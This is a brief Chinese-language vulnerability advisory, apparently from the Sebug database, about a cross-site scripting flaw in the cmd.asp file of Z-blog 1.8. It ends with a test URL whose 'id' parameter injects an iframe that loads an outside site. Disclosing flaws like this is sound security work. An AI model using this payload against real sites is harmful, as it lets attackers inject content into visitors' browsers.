@@ -1,0 +1,17 @@
+Z-blog 1.8 cmd.asp xss跨站漏洞
+
+漏洞版本:
+
+Z-blog 1.8
+漏洞描述:
+
+Zblog是基于Asp平台的Blog博客(网志)程序
+
+cmd.asp在对用户提交数据处理上存在安全漏洞
+<* 参考
+ http://sebug.net/
+ *>
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.http://www.ssvdb.com/cmd.asp?act=gettburl&id=10"><iframe%20src=http://www.mramydnei.com%20></iframe>
